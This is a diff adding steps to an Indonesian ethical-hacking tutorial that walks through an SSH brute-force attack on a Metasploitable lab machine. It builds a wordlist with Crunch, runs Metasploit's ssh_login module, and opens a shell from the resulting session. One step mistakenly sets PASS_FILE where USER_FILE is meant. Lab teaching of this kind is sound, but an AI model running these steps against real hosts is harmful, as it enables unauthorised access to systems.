@@ -344,7 +344,40 @@ disni saya menggubakan `Crunch` untuk membuat daftar kata yang akan kita gunakan
 
 ### STEP BY STEP
 
-1. untuk men generate daftar kata mengguakan `Crunch` gunakan perintah `crunch 8 8 msidfna`
+1. untuk men generate daftar kata mengguakan `Crunch` gunakan perintah :
+   - sebagai contoh disini saya menggunakan daftar kata yang sederhana untuk mempersingkat waktu praktik.
+```sh
+  crunch 8 8 msidfna -o username.txt
+  ```
+  - <img width="450" alt="Screenshot 2023-12-23 at 11 14 27" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/38178daa-131b-48bd-b7f6-7951f12d937c">
+
+2. selanjtutnya kita akan menggunakan modul dari metasploit yaitu `auxiliary`
+3. cd ke `/usr/share/metasploit-framework/modules/auxiliary/` untuk melihat modul dari auxiliary.
+4. disini kita akan menggunakan `SSH Scanner`, cd ke `scanner/ssh`.
+  - <img width="450" alt="Screenshot 2023-12-23 at 11 46 39" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/f6558080-b479-44b7-9040-c6e104464c93">
+5. kita akan gunakan file `ssh_login.rb` untuk melakukan Bruteforce Attack.
+6. buka metasploit, gunakam perintah `msfconsole`.
+7. gunakan perintah `use auxiliary/scanner/ssh/`.
+8. pilih file `shh_login.rb`, gunakan perintah `use 12`.
+9. gunakan perintah `show options` untuk melihat apa saja yang harus wajib di isi.
+  - <img width="450" alt="Screenshot 2023-12-23 at 12 02 43" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/6e28d51b-21ac-439d-b77b-b34b2ef234a4">
+10. untuk set RHOSTs gunakan perintah `set RHOSTS ip_address`.
+11. terlebih dahulu buat file `password.txt`, tinggal copy saja file `username.txt`, dan ubah namanya menjadi password.txt.
+12. untuk PASS_FILE gunakan perintah `set PASS_FILE ../../password.txt`.
+13. untuk USER_FILE gunakan perintah `set PASS_FILE ../../username.txt`.
+14. untuk menjalankan Brutefroce Attack ini gunakan perintah `run`.
+15. jika sudah menemukan username dan password yang cocok, tekan CTRL+C saja untuk `stop` Bruteforce.
+  - <img width="650" alt="Screenshot 2023-12-23 at 12 29 01" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/2cb2f568-89a5-4668-bacd-6fe4b54d8496">
+  - tetapi disini kita belum berada didalam shell metasploitable, cara masuk shellnya yaitu menggunakan session yang terbuka.
+16. gunakan perintah `sessions`.
+  - <img width="450" alt="Screenshot 2023-12-23 at 12 34 58" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/80efedab-0362-4e7b-9b12-0759f7991573">
+17. untuk menggunakan session tersebut yaitu gunakan perintah `sessions -i 1`
+  - <img width="520" alt="Screenshot 2023-12-23 at 12 37 52" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/79962c33-f21e-4cd8-b83d-df66ebb3546c">
+
+
+
+
+
 
 
 
